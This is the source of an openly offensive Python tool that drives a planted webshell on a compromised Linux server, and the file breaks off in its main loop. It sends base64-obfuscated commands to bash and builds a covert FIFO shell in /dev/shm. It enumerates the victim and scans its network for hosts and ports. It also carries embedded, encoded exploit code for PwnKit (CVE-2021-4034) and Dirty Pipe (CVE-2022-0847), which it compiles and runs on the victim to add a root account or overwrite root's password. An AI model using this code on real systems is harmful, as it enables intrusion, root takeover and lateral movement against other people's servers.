#!/usr/bin/env python3

# Libraries
import requests
import threading
import signal
import sys
import time
import argparse, re
import subprocess, pdb
from base64 import b64encode, b64decode
from random import randrange

# ------------------------------------
# Github: https://github.com/D3Ext
# Instagram: @D3Ext
# Twitter: @d3ext
# Linkedin: D3Ext
# ------------------------------------

# Katana banner
global mybanner
mybanner = '''\n              /\                               ______,....----,
/VVVVVVVVVVVVVV|===================""""""""""""       ___,..-\'
`^^^^^^^^^^^^^^|======================----------""""""
              \/'''

# Global Variables
global infile, outfile, mod, command_to_exec, tty, user, hostname
mod = randrange(1, 9999)
infile = f"/dev/shm/.fs/input.{mod}"
outfile = f"/dev/shm/.fs/output.{mod}"

# Colors
class c:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'

# Ctrl + C Function
def exit_handler(sig, frame):
    print(c.BLUE + "\n\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Interrupt handler received, exiting" + c.END)
    removeFiles(url, parameter)
    sys.exit(0)

signal.signal(signal.SIGINT, exit_handler)

# Remove input and output files at the exit
def removeFiles(url, parameter):
    removeCommand = """rm -rf /dev/shm/.fs/"""
    base64command = b64encode(removeCommand.encode()).decode()

    removeData = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Removing created files" + c.END)
    r = requests.post(url, data=removeData, timeout=5)

# Argument Parser Function
def parseArgs():
    p = argparse.ArgumentParser(description="D3Ext's Forwarded Shell - Interactive TTY and more")
    p.add_argument('-u', '--url', help="url of the webshell (Example: http://10.10.10.10/shell.php)", required=True)
    p.add_argument('-p', '--parameter', help="parameter of the webshell to exec commands (Example: cmd)", required=True)

    return p.parse_args()

# To check if the url receives the connections and requests
def checkConn(url):
    r = requests.get(url, timeout=4)
    if r.status_code == 200:
        print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Connection established succesfully" + c.END)
    else:
        print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Connection refused\n" + c.END)
        sys.exit(0)

# Function to create the fifos on the victim (to have an interactive tty)
def createFifos(url, parameter):

    # Create directory with the files in /dev/shm/.fs/
    raw_command = f"""mkdir /dev/shm/.fs"""
    base64command = b64encode(raw_command.encode()).decode()

    fifosData = {
        f'{parameter}': f'echo "{base64command}" | base64 -d | bash'
    }

    r = requests.post(url, data=fifosData, timeout=3)

    # Create input and output files under /dev/shm/.fs/
    try:
        raw_command = f"""mkfifo {infile}; tail -f {infile} | /bin/sh 2>&1 > {outfile}"""
        base64command = b64encode(raw_command.encode()).decode()

        fifosData = {
            f'{parameter}': f'echo "{base64command}" | base64 -d | bash'
        }

        print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Creating fifos on target system..." + c.END)
        r = requests.post(url, data=fifosData, timeout=5)

    except:
        None
    return None

# Function to read the file with the executed commands 
def readCommand(url, parameter):
    raw_command = f"""/bin/cat {outfile}"""
    base64command = b64encode(raw_command.encode()).decode()

    readData = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    r = requests.post(url, data=readData, timeout=5)

    return r.text

# Function to clear the output file with every command
def clearOutput(url, parameter):
    raw_command = f"""echo '' > {outfile}"""
    base64command = b64encode(raw_command.encode()).decode()

    clearData = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    r = requests.post(url, data=clearData, timeout=8)

# Function to execute commands after creating the fifos
def execCommand(url, parameter, command):
    base64command = b64encode(command.encode()).decode()

    rce_data = {
        f"{parameter}": f'echo "{base64command}" | base64 -d > {infile}'
    }

    r = requests.post(url, data=rce_data, timeout=10)

# Function to launch some privesc exploits
def tryExploits(url, parameter):

    bins = checkBinaries(url, parameter)
    if "gcc" not in bins:
        print(c.BLUE + "\ngcc not found in target system\n" + c.END)

    else:
        print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Uploading and compiling exploits" + c.END)

    base64exploit = "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKY2hhciAqc2hlbGwgPQoiI2luY2x1ZGUgPHN0ZGlvLmg+XG4iCiIjaW5jbHVkZSA8c3RkbGliLmg+XG4iCiIjaW5jbHVkZSA8dW5pc3RkLmg+XG4iCiIjaW5jbHVkZSA8c3lzL3R5cGVzLmg+XG4iCiIjaW5jbHVkZSA8c3lzL3N0YXQuaD5cbiIKIiNpbmNsdWRlIDxmY250bC5oPlxuIgoiI2luY2x1ZGUgPHN0cmluZy5oPlxuIgoic3RydWN0IFVzZXJpbmZvIHtcbiIKIiAgICBjaGFyICp1c2VybmFtZTtcbiIKIiAgICBjaGFyICpoYXNoO1xuIgoiICAgIGludCB1c2VyX2lkO1xuIgoiICAgIGludCBncm91cF9pZDtcbiIKIiAgICBjaGFyICppbmZvO1xuIgoiICAgIGNoYXIgKmhvbWVfZGlyO1xuIgoiICAgIGNoYXIgKnNoZWxsO1xuIgoifTtcbiIKImNoYXIgKmdlbmVyYXRlX3Bhc3N3b3JkX2hhc2goY2hhciAqcGxhaW50ZXh0X3B3KSB7XG4iCiIgIGNvbnN0IGNoYXIgKnNhbHQgPSBcInNhbHRcIjtcbiIKIiAgcmV0dXJuIGNyeXB0KHBsYWludGV4dF9wdywgc2FsdCk7XG4iCiJ9XG4iCiJjaGFyICpnZW5lcmF0ZV9wYXNzd2RfbGluZShzdHJ1Y3QgVXNlcmluZm8gdSkge1xuIgoiICBjb25zdCBjaGFyICpmb3JtYXQgPSBcIiVzOiVzOiVkOiVkOiVzOiVzOiVzXFxuXCI7XG4iCiIgIGludCBzaXplID0gc25wcmludGYoTlVMTCwgMCwgZm9ybWF0LCB1LnVzZXJuYW1lLCB1Lmhhc2gsXG4iCiIgICAgdS51c2VyX2lkLCB1Lmdyb3VwX2lkLCB1LmluZm8sIHUuaG9tZV9kaXIsIHUuc2hlbGwpO1xuIgoiICBjaGFyICpyZXQgPSBtYWxsb2Moc2l6ZSArIDEpO1xuIgoiICBzcHJpbnRmKHJldCwgZm9ybWF0LCB1LnVzZXJuYW1lLCB1Lmhhc2gsIHUudXNlcl9pZCxcbiIKIiAgICB1Lmdyb3VwX2lkLCB1LmluZm8sIHUuaG9tZV9kaXIsIHUuc2hlbGwpO1xuIgoiICByZXR1cm4gcmV0O1xuIgoifVxuIgoiXG4iCiJpbnQgY29weV9maWxlKGNvbnN0IGNoYXIgKmZyb20sIGNvbnN0IGNoYXIgKnRvKSB7XG4iCiIgIGlmKGFjY2Vzcyh0bywgRl9PSykgIT0gLTEpIHtcbiIKIiAgICBwcmludGYoXCJGaWxlICVzIGFscmVhZHkgZXhpc3RzISBQbGVhc2UgZGVsZXRlIGl0IGFuZCBydW4gYWdhaW5cXG5cIix0byk7XG4iCiIgICAgcmV0dXJuIC0xO1xuIgoiICB9XG4iCiIgIGNoYXIgY2g7XG4iCiIgIEZJTEUgKnNvdXJjZSwgKnRhcmdldDtcbiIKIiAgc291cmNlID0gZm9wZW4oZnJvbSwgXCJyXCIpO1xuIgoiICBpZihzb3VyY2UgPT0gTlVMTCkge1xuIgoiICAgIHJldHVybiAtMTtcbiIKIiAgfVxuIgoiICB0YXJnZXQgPSBmb3Blbih0bywgXCJ3XCIpO1xuIgoiICBpZih0YXJnZXQgPT0gTlVMTCkge1xuIgoiICAgICBmY2xvc2Uoc291cmNlKTtcbiIKIiAgICAgcmV0dXJuIC0xO1xuIgoiICB9XG4iCiIgIHdoaWxlKChjaCA9IGZnZXRjKHNvdXJjZSkpICE9IEVPRikge1xuIgoiICAgICBmcHV0YyhjaCwgdGFyZ2V0KTtcbiIKIiAgIH1cbiIKIiAgcHJpbnRmKFwiJXMgc3VjY2Vzc2Z1bGx5IGJhY2tlZCB1cCB0byAlc1xcblwiLGZyb20sIHRvKTtcbiIKIiAgZmNsb3NlKHNvdXJjZSk7XG4iCiIgIGZjbG9zZSh0YXJnZXQpO1xuIgoiICByZXR1cm4gMDtcbiIKIn1cbiIKIlxuIgoiaW50IHdyaXRlX2ZpbGUoY29uc3QgY2hhciAqIGZpbGVuYW1lLCBpbnQgY29udGVudF9sZW4sY2hhciAqIGNvbnRlbnQpe1xuIgoiICBGSUxFICogZmlsZV9mZCA9IGZvcGVuKGZpbGVuYW1lLCBcImFcIik7XG4iCiIgIGlmKGZpbGVfZmQgPT0gTlVMTCkgIFxuIgoiICAgIHsgIFxuIgoiICAgICAgICBwdXRzKFwiZXJybm9cIik7ICBcbiIKIiAgICAgICAgcmV0dXJuIC0xO1xuIgoiICAgIH0gIFxuIgoiICAgIGVsc2UgICBcbiIKIiAgICB7ICBcbiIKIiAgICAgICBwdXRzKFwiRmlsZSBPcGVuIHN1Y2Nlc3NlZCFcXG5cIik7IFxuIgoiICAgICAgIC8vIHNpemVfdCBmd3JpdGUoY29uc3Qgdm9pZCAqcHRyLCBzaXplX3Qgc2l6ZSwgc2l6ZV90IG5tZW1iLEZJTEUgKnN0cmVhbSk7XG4iCiIgICAgICAgc2l6ZV90IHdyaXRlZCA9IGZ3cml0ZShjb250ZW50LGNvbnRlbnRfbGVuLDEsZmlsZV9mZCk7XG4iCiIgICAgICAgaWYod3JpdGVkID09IGNvbnRlbnRfbGVuKXtcbiIKIiAgICAgICAgICAgcHV0cyhcIldyaXRlIFN1Y2Nlc3MhXFxuXCIpO1xuIgoiICAgICAgICAgICBmY2xvc2UoZmlsZV9mZCk7XG4iCiIgICAgICAgICAgIHJldHVybiAxO1xuIgoiICAgICAgICB9XG4iCiIgICAgfVxuIgoiICAgIHJldHVybiAxO1xuIgoifVxuIgoidm9pZCBnY29udigpIHt9XG4iCiJcbiIKInZvaWQgZ2NvbnZfaW5pdCgpe1xuIgoiICAgIGNoYXIgKnN1ZG9lciA9IFwicm9vdGVyCUFMTD0oQUxMOkFMTCkgQUxMXCI7XG4iCiIgICAgY2hhciAqcGxhaW50ZXh0X3B3PVwiSGVsbG9AV29ybGRcIjtcbiIKIiAgICBzdHJ1Y3QgVXNlcmluZm8gdXNlcjtcbiIKIiAgICB1c2VyLnVzZXJuYW1lID0gXCJyb290ZXJcIjtcbiIKIiAgICB1c2VyLnVzZXJfaWQgPSAwO1xuIgoiICAgIHVzZXIuZ3JvdXBfaWQgPSAwO1xuIgoiICAgIHVzZXIuaW5mbyA9IFwicm9vdFwiO1xuIgoiICAgIHVzZXIuaG9tZV9kaXIgPSBcIi9yb290XCI7XG4iCiIgICAgdXNlci5zaGVsbCA9IFwiL2Jpbi9iYXNoXCI7XG4iCiIgICAgdXNlci5oYXNoID0gZ2VuZXJhdGVfcGFzc3dvcmRfaGFzaChwbGFpbnRleHRfcHcpO1xuIgoiICAgIGNoYXIgKmNvbXBsZXRlX3Bhc3N3ZF9saW5lID0gZ2VuZXJhdGVfcGFzc3dkX2xpbmUodXNlcik7XG4iCiIgICAgY29weV9maWxlKFwiL2V0Yy9wYXNzd2RcIixcIi90bXAvcGFzc3dkLmJha1wiKTtcbiIKIiAgICB3cml0ZV9maWxlKFwiL2V0Yy9wYXNzd2RcIixzdHJsZW4oY29tcGxldGVfcGFzc3dkX2xpbmUpLGNvbXBsZXRlX3Bhc3N3ZF9saW5lKTtcbiIKIiAgICBzeXN0ZW0oXCJjaG1vZCBhK3cgL2V0Yy9zdWRvZXJzXCIpO1xuIgoiICAgIGNvcHlfZmlsZShcIi9ldGMvc3Vkb2Vyc1wiLFwiL3RtcC9zdWRvZXJzLmJha1wiKTtcbiIKIiAgICB3cml0ZV9maWxlKFwiL2V0Yy9zdWRvZXJzXCIsc3RybGVuKHN1ZG9lciksc3Vkb2VyKTtcbiIKIiAgICBwdXRzKFwiWytdIFByaXZpbGVnZWQgdXNlciBhZGRlZCBzdWNjZXNzZnVsbHkuLi5cIik7XG4iCiIgICAgcHV0cyhcIlVzZXJuYW1lOiByb290ZXJcIik7XG4iCiIgICAgcHV0cyhcIlBhc3N3b3JkOiBIZWxsb0BXb3JsZFwiKTtcblxuIgoifSI7CgppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKSB7CglGSUxFICpmcDsKCXN5c3RlbSgibWtkaXIgLXAgJ0dDT05WX1BBVEg9Lic7IHRvdWNoICdHQ09OVl9QQVRIPS4vcHdua2l0JzsgY2htb2QgYSt4ICdHQ09OVl9QQVRIPS4vcHdua2l0JyIpOwoJc3lzdGVtKCJta2RpciAtcCBwd25raXQ7IGVjaG8gJ21vZHVsZSBVVEYtOC8vIFBXTktJVC8vIHB3bmtpdCAyJyA+IHB3bmtpdC9nY29udi1tb2R1bGVzIik7CglmcCA9IGZvcGVuKCJwd25raXQvcHdua2l0LmMiLCAidyIpOwoJZnByaW50ZihmcCwgIiVzIiwgc2hlbGwpOwoJZmNsb3NlKGZwKTsKCXN5c3RlbSgiZ2NjIHB3bmtpdC9wd25raXQuYyAtbyBwd25raXQvcHdua2l0LnNvIC1sY3J5cHQgLXNoYXJlZCAtZlBJQyIpOwoJY2hhciAqZW52W10gPSB7ICJwd25raXQiLCAiUEFUSD1HQ09OVl9QQVRIPS4iLCAiQ0hBUlNFVD1QV05LSVQiLCAiU0hFTEw9cHdua2l0IiwgTlVMTCB9OwoJZXhlY3ZlKCIvdXNyL2Jpbi9wa2V4ZWMiLCAoY2hhcipbXSl7TlVMTH0sIGVudik7Cn0="
    
    command_to_exec = f"""echo {base64exploit} | base64 -d > /dev/shm/.fs/cve-2021-4034.c"""
    time.sleep(1)
    execCommand(url, parameter, command_to_exec + "\n")

    base64exploit = "I2RlZmluZSBfR05VX1NPVVJDRQojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxmY250bC5oPgojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8c3RyaW5nLmg+CiNpbmNsdWRlIDxzeXMvc3RhdC5oPgojaW5jbHVkZSA8c3lzL3VzZXIuaD4KCiNpZm5kZWYgUEFHRV9TSVpFCiNkZWZpbmUgUEFHRV9TSVpFIDQwOTYKI2VuZGlmCgpzdGF0aWMgdm9pZCBwcmVwYXJlX3BpcGUoaW50IHBbMl0pCnsKCWlmIChwaXBlKHApKSBhYm9ydCgpOwoKCWNvbnN0IHVuc2lnbmVkIHBpcGVfc2l6ZSA9IGZjbnRsKHBbMV0sIEZfR0VUUElQRV9TWik7CglzdGF0aWMgY2hhciBidWZmZXJbNDA5Nl07CgoJZm9yICh1bnNpZ25lZCByID0gcGlwZV9zaXplOyByID4gMDspIHsKCQl1bnNpZ25lZCBuID0gciA+IHNpemVvZihidWZmZXIpID8gc2l6ZW9mKGJ1ZmZlcikgOiByOwoJCXdyaXRlKHBbMV0sIGJ1ZmZlciwgbik7CgkJciAtPSBuOwoJfQoKCWZvciAodW5zaWduZWQgciA9IHBpcGVfc2l6ZTsgciA+IDA7KSB7CgkJdW5zaWduZWQgbiA9IHIgPiBzaXplb2YoYnVmZmVyKSA/IHNpemVvZihidWZmZXIpIDogcjsKCQlyZWFkKHBbMF0sIGJ1ZmZlciwgbik7CgkJciAtPSBuOwoJfQp9CgppbnQgbWFpbigpIHsKCWNvbnN0IGNoYXIgKmNvbnN0IHBhdGggPSAiL2V0Yy9wYXNzd2QiOwoKICAgICAgICBwcmludGYoIkJhY2tpbmcgdXAgL2V0Yy9wYXNzd2QgdG8gL3RtcC9wYXNzd2QuYmFrIC4uLlxuIik7CiAgICAgICAgRklMRSAqZjEgPSBmb3BlbigiL2V0Yy9wYXNzd2QiLCAiciIpOwogICAgICAgIEZJTEUgKmYyID0gZm9wZW4oIi90bXAvcGFzc3dkLmJhayIsICJ3Iik7CgogICAgICAgIGlmIChmMSA9PSBOVUxMKSB7CiAgICAgICAgICAgIHByaW50ZigiRmFpbGVkIHRvIG9wZW4gL2V0Yy9wYXNzd2RcbiIpOwogICAgICAgICAgICBleGl0KEVYSVRfRkFJTFVSRSk7CiAgICAgICAgfSBlbHNlIGlmIChmMiA9PSBOVUxMKSB7CiAgICAgICAgICAgIHByaW50ZigiRmFpbGVkIHRvIG9wZW4gL3RtcC9wYXNzd2QuYmFrXG4iKTsKICAgICAgICAgICAgZmNsb3NlKGYxKTsKICAgICAgICAgICAgZXhpdChFWElUX0ZBSUxVUkUpOwogICAgICAgIH0KCiAgICAgICAgY2hhciBjOwogICAgICAgIHdoaWxlICgoYyA9IGZnZXRjKGYxKSkgIT0gRU9GKQogICAgICAgICAgICBmcHV0YyhjLCBmMik7CgogICAgICAgIGZjbG9zZShmMSk7CiAgICAgICAgZmNsb3NlKGYyKTsKCglsb2ZmX3Qgb2Zmc2V0ID0gNDsgLy8gYWZ0ZXIgdGhlICJyb290IgoJY29uc3QgY2hhciAqY29uc3QgZGF0YSA9ICI6JDYkcm9vdCR4Z0pzUTd5YW9iODZRRkdRUVlPSzBVVWoudFhxS24wU0x3UFJxQ2FMczE5cHFZcjBwMWV1WVlMcUlDNldoMk55aWlaMFk5bFhKa0NsUmlaa2VCL1EuMDowOjA6dGVzdDovcm9vdDovYmluL3NoXG4iOyAvLyBvcGVuc3NsIHBhc3N3ZCAtMSAtc2FsdCByb290IHBpcGVkIAogICAgICAgIHByaW50ZigiU2V0dGluZyByb290IHBhc3N3b3JkIHRvIFwicGlwZWRcIi4uLlxuIik7Cgljb25zdCBzaXplX3QgZGF0YV9zaXplID0gc3RybGVuKGRhdGEpOwoKCWlmIChvZmZzZXQgJSBQQUdFX1NJWkUgPT0gMCkgewoJCWZwcmludGYoc3RkZXJyLCAiU29ycnksIGNhbm5vdCBzdGFydCB3cml0aW5nIGF0IGEgcGFnZSBib3VuZGFyeVxuIik7CgkJcmV0dXJuIEVYSVRfRkFJTFVSRTsKCX0KCgljb25zdCBsb2ZmX3QgbmV4dF9wYWdlID0gKG9mZnNldCB8IChQQUdFX1NJWkUgLSAxKSkgKyAxOwoJY29uc3QgbG9mZl90IGVuZF9vZmZzZXQgPSBvZmZzZXQgKyAobG9mZl90KWRhdGFfc2l6ZTsKCWlmIChlbmRfb2Zmc2V0ID4gbmV4dF9wYWdlKSB7CgkJZnByaW50ZihzdGRlcnIsICJTb3JyeSwgY2Fubm90IHdyaXRlIGFjcm9zcyBhIHBhZ2UgYm91bmRhcnlcbiIpOwoJCXJldHVybiBFWElUX0ZBSUxVUkU7Cgl9CgoJY29uc3QgaW50IGZkID0gb3BlbihwYXRoLCBPX1JET05MWSk7IC8vIHllcywgcmVhZC1vbmx5ISA6LSkKCWlmIChmZCA8IDApIHsKCQlwZXJyb3IoIm9wZW4gZmFpbGVkIik7CgkJcmV0dXJuIEVYSVRfRkFJTFVSRTsKCX0KCglzdHJ1Y3Qgc3RhdCBzdDsKCWlmIChmc3RhdChmZCwgJnN0KSkgewoJCXBlcnJvcigic3RhdCBmYWlsZWQiKTsKCQlyZXR1cm4gRVhJVF9GQUlMVVJFOwoJfQoKCWlmIChvZmZzZXQgPiBzdC5zdF9zaXplKSB7CgkJZnByaW50ZihzdGRlcnIsICJPZmZzZXQgaXMgbm90IGluc2lkZSB0aGUgZmlsZVxuIik7CgkJcmV0dXJuIEVYSVRfRkFJTFVSRTsKCX0KCglpZiAoZW5kX29mZnNldCA+IHN0LnN0X3NpemUpIHsKCQlmcHJpbnRmKHN0ZGVyciwgIlNvcnJ5LCBjYW5ub3QgZW5sYXJnZSB0aGUgZmlsZVxuIik7CgkJcmV0dXJuIEVYSVRfRkFJTFVSRTsKCX0KCgoJaW50IHBbMl07CglwcmVwYXJlX3BpcGUocCk7CgoJLS1vZmZzZXQ7Cglzc2l6ZV90IG5ieXRlcyA9IHNwbGljZShmZCwgJm9mZnNldCwgcFsxXSwgTlVMTCwgMSwgMCk7CglpZiAobmJ5dGVzIDwgMCkgewoJCXBlcnJvcigic3BsaWNlIGZhaWxlZCIpOwoJCXJldHVybiBFWElUX0ZBSUxVUkU7Cgl9CglpZiAobmJ5dGVzID09IDApIHsKCQlmcHJpbnRmKHN0ZGVyciwgInNob3J0IHNwbGljZVxuIik7CgkJcmV0dXJuIEVYSVRfRkFJTFVSRTsKCX0KCgluYnl0ZXMgPSB3cml0ZShwWzFdLCBkYXRhLCBkYXRhX3NpemUpOwoJaWYgKG5ieXRlcyA8IDApIHsKCQlwZXJyb3IoIndyaXRlIGZhaWxlZCIpOwoJCXJldHVybiBFWElUX0ZBSUxVUkU7Cgl9CglpZiAoKHNpemVfdCluYnl0ZXMgPCBkYXRhX3NpemUpIHsKCQlmcHJpbnRmKHN0ZGVyciwgInNob3J0IHdyaXRlXG4iKTsKCQlyZXR1cm4gRVhJVF9GQUlMVVJFOwoJfQoKCWNoYXIgKmFyZ3ZbXSA9IHsiL2Jpbi9zaCIsICItYyIsICIoZWNobyBwaXBlZDsgY2F0KSB8IHN1IC0gLWMgXCIiCiAgICAgICAgICAgICAgICAiZWNobyBcXFwiUmVzdG9yaW5nIC9ldGMvcGFzc3dkIGZyb20gL3RtcC9wYXNzd2QuYmFrLi4uXFxcIjsiCiAgICAgICAgICAgICAgICAiY3AgL3RtcC9wYXNzd2QuYmFrIC9ldGMvcGFzc3dkOyIKICAgICAgICAgICAgICAgICJlY2hvIFxcXCJEb25lISByb290IHBhc3N3b3JkIGNoYW5nZWRcXFwiOyIKICAgICAgICAgICAgIlwiIHJvb3QifTsKICAgICAgICBleGVjdigiL2Jpbi9zaCIsIGFyZ3YpOwoKICAgICAgICBwcmludGYoInN5c3RlbSgpIGZ1bmN0aW9uIGNhbGwgc2VlbXMgdG8gaGF2ZSBmYWlsZWQgOihcbiIpOwoJcmV0dXJuIEVYSVRfU1VDQ0VTUzsKfQ=="

    command_to_exec = f"""echo {base64exploit} | base64 -d > /dev/shm/.fs/cve-2022-0847.c"""
    time.sleep(1)
    execCommand(url, parameter, command_to_exec + "\n")

    command_to_exec = """gcc /dev/shm/.fs/cve-2022-0847.c -o /dev/shm/.fs/cve-2022-0847"""
    execCommand(url, parameter, command_to_exec + "\n")

    command_to_exec = """gcc /dev/shm/.fs/cve-2021-4034.c -o /dev/shm/.fs/cve-2021-4034"""
    execCommand(url, parameter, command_to_exec + "\n")

    print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Executing exploits" + c.END)
    time.sleep(0.5)
    # Dirty Pipe
    print(c.BLUE + "\nExecuting Dity Pipe exploit" + c.END)
    command_to_exec = """/dev/shm/.fs/cve-2022-0847"""
    execCommand(url, parameter, command_to_exec + "\n")

    resp = readCommand(url, parameter)
    resp = cleanHTML(resp)
    print(resp)
    clearOutput(url, parameter)
    # Pwnkit
    print(c.BLUE + "Executing pwnkit exploit" + c.END)
    command_to_exec = """/dev/shm/.fs/cve-2021-4034"""
    execCommand(url, parameter, command_to_exec + "\n")

    resp = readCommand(url, parameter)
    resp = cleanHTML(resp)
    print(resp)
    clearOutput(url, parameter)

# Function to execute especial commands without the fifos and returning them
def execCustomCommand(url, parameter, command):
    base64command = b64encode(command.encode()).decode()

    rce_data = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    r = requests.post(url, data=rce_data, timeout=15)

    return r.text

# Function to check useful binaries on the victim
def checkBinaries(url, parameter):
    raw_command = """which nmap aws nc ncat netcat nc.traditional wget curl ping gcc make gdb base64 socat python python2 python3 python2.7 python3.7 perl php ruby xterm sudo docker lxc 2>/dev/null"""
    base64command = b64encode(raw_command.encode()).decode()

    enum_data = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    r = requests.post(url, data=enum_data, timeout=8)

    return r.text

# Function to enumerate the system
def enumSys(url, parameter):
    raw_command = """whoami"""
    user = execCustomCommand(url, parameter, raw_command)

    raw_command = """hostname"""
    hostname = execCustomCommand(url, parameter, raw_command)

    raw_command = """hostname -I"""
    ip = execCustomCommand(url, parameter, raw_command)

    raw_command = """uname -a"""
    uname = execCustomCommand(url, parameter, raw_command)

    raw_command = """id"""
    id_output = execCustomCommand(url, parameter, raw_command)

    raw_command = """ls /home"""
    users = execCustomCommand(url, parameter, raw_command)
    users = cleanHTML(users)
    users = users.strip('\n').replace('\n', ', ')

    raw_command = """echo $PATH"""
    path = execCustomCommand(url, parameter, raw_command)

    raw_command = """sudo --version 2>/dev/null | head -n 1 | awk '{print $NF}'"""
    sudo_version = execCustomCommand(url, parameter, raw_command)

    return user, hostname, ip, uname, id_output, users, path, sudo_version

# Function to get the user and the hostname to create a realist shell
def getUserHostname(url, parameter):
    raw_command = """whoami"""
    user = execCustomCommand(url, parameter, raw_command)

    raw_command = """hostname"""
    hostname = execCustomCommand(url, parameter, raw_command)

    return user, hostname

# Function to upload files
def uploadFile(url, parameter, file_to_upload):
    print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Uploading file to the server" + c.END)
    fileContent = open(file_to_upload, "r").read()
    base64file = b64encode(fileContent.encode()).decode()
    upload_command = f"""echo {base64file} | base64 -d > /dev/shm/.fs/{file_to_upload}"""

    uploadData = {
        f"{parameter}": f"{upload_command}"
    }

    r = requests.post(url, data=uploadData, timeout=8)

    time.sleep(1)
    print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + f"] {file_to_upload} uploaded successfully in /dev/shm/.fs/{file_to_upload}\n" + c.END)

# Function to download a file
def downloadFile(url, parameter, file_to_download):
    print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Downloading file from the server" + c.END)
    download_command = f"""base64 -w 0 {file_to_download}""" 
    base64command = b64encode(download_command.encode()).decode()

    downloadData = {
        f"{parameter}": f"echo {base64command} | base64 -d | bash"
    }

    r = requests.post(url, data=downloadData, timeout=12)

    time.sleep(1)
    fileContent = cleanHTML(r.text)
    fileContent = b64decode(fileContent).decode()

    stored_file = file_to_download.split('/')[-1]
    f = open(f"{stored_file}", "w")
    f.write(fileContent)
    f.close()

    print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + f"] File downloaded successfully as {stored_file}\n" + c.END)

# Perform a basic ping sweep to detect active IPs
def hostScan(url, parameter, ip):
    
    print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Starting host discovery, system must have ping installed\n" + c.END)
    raw_command = """for number in $(seq 1 254); do timeout 1 bash -c "ping -c 1 %s.${number}" &>/dev/null && echo -e "%s.${number}" >> /dev/shm/.fs/logs.tmp & done""" % (ip, ip)
    base64command = b64encode(raw_command.encode()).decode()
    
    hostData = {
        f"{parameter}": f"echo {base64command} | base64 -d | bash"
    }
    
    r = requests.post(url, data=hostData, timeout=12)

    raw_command = """cat /dev/shm/.fs/logs.tmp"""
    base64command = b64encode(raw_command.encode()).decode()
    
    hostData = {
        f"{parameter}": f"echo {base64command} | base64 -d | bash"
    }

    r = requests.post(url, data=hostData, timeout=8)
    
    data = cleanHTML(r.text)
    if data:
        print(c.YELLOW + "Hosts" + c.END)
        print(c.YELLOW + "-----" + c.END)
        print(data)
    else:
        print(c.BLUE + "[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] No hosts discovered\n" + c.END)

# Function to discover open ports on especified ip
def portScan(url, parameter, ip):

    print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Starting port discovery, no requirements are needed\n" + c.END)
    raw_command = """for port in $(seq 1 5000); do timeout 1 bash -c "(echo '' > /dev/tcp/%s/${port})" 2>/dev/null && echo -e "${port}" & done""" % (ip)
    base64command = b64encode(raw_command.encode()).decode()

    portData = {
        f"{parameter}": f"echo {base64command} | base64 -d | bash"
    }
    
    r = requests.post(url, data=portData, timeout=20)

    data = cleanHTML(r.text)
    if data:
        print(c.YELLOW + "Ports" + c.END)
        print(c.YELLOW + "-----" + c.END)
        print(data)
    else:
        print(c.BLUE + "[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] No ports discovered\n" + c.END)

# Clean RCE output
def cleanHTML(out):
    clean = re.compile('<.*?>')
    cleanout = re.sub(clean, '', out)
    try:
        if tty == 1:
            cleanout = cleanout.split(f'\x00{command_to_exec}')[1]
            cfile = open("/dev/shm/.clean", "w")
            cfile.write(cleanout)
            cfile.close()
            
            cleanout = open("/dev/shm/.clean", "r").read()
            cleanout = "\n".join(cleanout.split("\n")[:-1])
    except:
        pass

    return cleanout

# Main Function
if __name__ == '__main__':

    # Parse arguments and declare variables
    parse = parseArgs()

    url = parse.url
    parameter = parse.parameter

    # Print banner
    print(c.YELLOW + mybanner + c.END)

    # Check connections to the webshell
    checkConn(url)

    # Create an interactive shell
    createFifos(url, parameter)
    print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Getting system info" + c.END)
    user, hostname = getUserHostname(url, parameter)

    user = cleanHTML(user)
    hostname = cleanHTML(hostname)

    print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Type dfs-help to see a list of custom commands of this forwarded shell\n" + c.END)

    customCommands = ["dfs-help", "help-dfs", "dfs-enum", "enum-dfs", "dfs-exit", "exit-dfs", "dfs-exploit", "exploit-dfs", "dfs-exploits", "dfs-binaries", "binaries-dfs", "dfs-download", "download-dfs", "dfs-upload", "upload-dfs", "dfs-hostscan", "hostscan-dfs", "dfs-portscan", "portscan-dfs", "dfs-tty", "tty-dfs"]
    
    # Loop to execute commands
    while True:
        # Check if user has changed to update the shell prompt
        try:
            if command_to_exec == "sh":
                execCommand(url, parameter, "echo $USER" + "\n")
                user = readCommand(url, parameter)
